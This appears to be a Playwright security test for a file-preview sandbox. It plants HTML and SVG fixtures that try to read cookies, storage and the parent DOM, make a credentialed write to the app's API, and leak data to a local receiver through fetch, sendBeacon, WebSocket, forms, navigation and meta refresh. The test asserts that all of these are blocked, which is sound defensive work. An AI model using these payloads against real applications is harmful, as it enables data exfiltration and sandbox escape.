const {chromium}=require(process.env.PLAYWRIGHT_MODULE || 'playwright');
const fs=require('fs'),http=require('http'),assert=require('assert/strict');
const root=process.env.HALDUR_FILE_TOOLS_TEST_ROOT || '/private/tmp/ued-skill-file-tools-test', origin='http://127.0.0.1:5447', receiver='http://127.0.0.1:5449';
if (!require('path').resolve(root).startsWith('/private/tmp/ued-skill-') || !fs.existsSync(root+'/.synthetic-file-tools-root')) throw new Error('Prepared synthetic fixture required; never use demo data.');
(async()=>{
 const hits=[];const server=http.createServer((req,res)=>{hits.push({url:req.url,method:req.method});res.end('receiver');});server.on('upgrade',(req,socket)=>{hits.push({url:req.url,method:'UPGRADE'});socket.destroy()});await new Promise(r=>server.listen(5449,'127.0.0.1',r));
 const html=`<h1>安全边界测试</h1><pre id="result"></pre><img src="${receiver}/initial-image"><link rel=stylesheet href="${receiver}/initial-style"><script src="${receiver}/initial-script"></script><meta http-equiv=refresh content="0;url=${receiver}/initial-meta"><script>
 const report={}; for(const [key,fn] of Object.entries({parentDOM:()=>parent.document.body, cookie:()=>document.cookie, storage:()=>localStorage.getItem('x')})){try{fn();report[key]='OPEN'}catch{report[key]='BLOCKED'}}
 try{fetch('${origin}/api/haldur-design-skill/files',{method:'POST',credentials:'include',body:'evil'}).catch(()=>{});report.writeAttempt='sent'}catch{}
 try{fetch('${receiver}/fetch?leak=synthetic').catch(()=>{})}catch{};try{navigator.sendBeacon('${receiver}/beacon','synthetic')}catch{};try{new WebSocket('ws://127.0.0.1:5449/ws')}catch{};
 try{window.open('${receiver}/popup')}catch{};try{top.location='${receiver}/top'}catch{};
 const img=new Image();img.src='${receiver}/dynamic-image';document.body.append(img);
 const script=document.createElement('script');script.src='${receiver}/dynamic-script';document.body.append(script);
 const f=document.createElement('form');f.method='POST';f.action='${receiver}/form';document.body.append(f);try{f.submit()}catch{};
 document.querySelector('#result').textContent=JSON.stringify(report);
 setTimeout(()=>{try{location.href='${receiver}/navigation?leak=synthetic'}catch{}},1000);
 setTimeout(()=>{const m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url=${receiver}/dynamic-meta';document.head.append(m)},1600);
 </script>`;
 fs.writeFileSync(root+'/skill/示例目录/attack.html',html);
 fs.writeFileSync(root+'/skill/示例目录/attack.svg',`<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100" onload="fetch('${receiver}/svg-event')"><script>fetch('${receiver}/svg-script')</script><image href="${receiver}/svg-image" width="100" height="100"/><rect width="80" height="80" fill="green"/></svg>`);
 const b=await chromium.launch({headless:true,channel:'chrome'});const p=await b.newPage({viewport:{width:1440,height:1000}});const writes=[];p.on('request',r=>{if(r.url().startsWith(origin+'/api/')&&r.method()!=='GET')writes.push(r.url())});
 const view=path=>origin+'/api/haldur-design-skill/preview/view?path='+encodeURIComponent(path);
 try{
  await p.goto(view('示例目录/交互预览 (#1).html'));await p.frameLocator('iframe').locator('#count').waitFor();let f=p.frames().find(f=>f.url().startsWith('blob:'));assert.ok(f);await f.locator('#count').click();assert.equal(await f.locator('#value').textContent(),'1');assert.equal(await f.locator('body').evaluate(e=>getComputedStyle(e).backgroundColor),'rgb(238, 246, 240)');assert.equal(await f.locator('img').evaluate(e=>e.naturalWidth),240);assert.ok((await f.locator('.logo').evaluate(e=>getComputedStyle(e).backgroundImage)).includes('data:image/svg+xml'));await f.locator('summary').click();assert.equal(await f.locator('details').getAttribute('open'),'');
  await p.screenshot({path:root+'/evidence/html-new-tab-1440.png'});await p.reload();await p.frameLocator('iframe').locator('#count').waitFor();f=p.frames().find(f=>f.url().startsWith('blob:'));assert.ok(f);await f.locator('#count').click();assert.equal(await f.locator('#value').textContent(),'1');
  await p.goto(view('示例目录/独立.html'));await p.frameLocator('iframe').getByRole('button').waitFor();f=p.frames().find(f=>f.url().startsWith('blob:'));await f.getByRole('button',{name:'本地按钮'}).click();assert.equal(await f.getByRole('button').textContent(),'已点击');
  await p.goto(view('示例目录/attack.html'));await p.frameLocator('iframe').locator('#result').waitFor();f=p.frames().find(f=>f.url().startsWith('blob:'));assert.ok(f);const report=JSON.parse(await f.locator('#result').textContent());await p.waitForTimeout(1900);assert.ok(!p.frames().some(f=>f.url().startsWith(receiver)),'external navigation blocked');assert.equal(report.parentDOM,'BLOCKED');assert.equal(report.cookie,'BLOCKED');assert.equal(report.storage,'BLOCKED');assert.equal(hits.length,0,'no receiver traffic, including self-navigation/meta');assert.equal(writes.length,0,'no Hub write attempts reached network');
  await p.screenshot({path:root+'/evidence/security-blocked.png'});
  await p.goto(view('示例目录/attack.svg'));await p.locator('img').waitFor();await p.waitForTimeout(500);assert.equal(hits.length,0);assert.equal(await p.locator('img').evaluate(e=>e.naturalWidth),200);
  await p.goto(view('示例目录/矢量图.svg'));await p.locator('img').waitFor();await p.screenshot({path:root+'/evidence/svg-preview-1440.png'});
  await p.goto(view('示例目录/缺失.html'));await p.waitForTimeout(700);assert.match(await p.locator('#status').innerText(),/missing.css/);assert.match(await p.locator('#status').innerText(),/missing.svg/);
  const result={result:'PASS',inlineHTML:true,relativeCSS:true,relativeJS:true,relativeSVG:true,cssBackground:true,expandInteraction:true,newTabRefresh:true,blockedParentDOM:report.parentDOM,blockedCookie:report.cookie,blockedStorage:report.storage,externalReceiverHits:hits,hubWrites:writes,svgScriptsBlocked:true,missingResourceMessages:true};fs.writeFileSync(root+'/evidence/preview-browser-security.json',JSON.stringify(result,null,2));console.log(result);
 }finally{await b.close();await new Promise(r=>server.close(r));}
})().catch(e=>{console.error(e);process.exitCode=1});
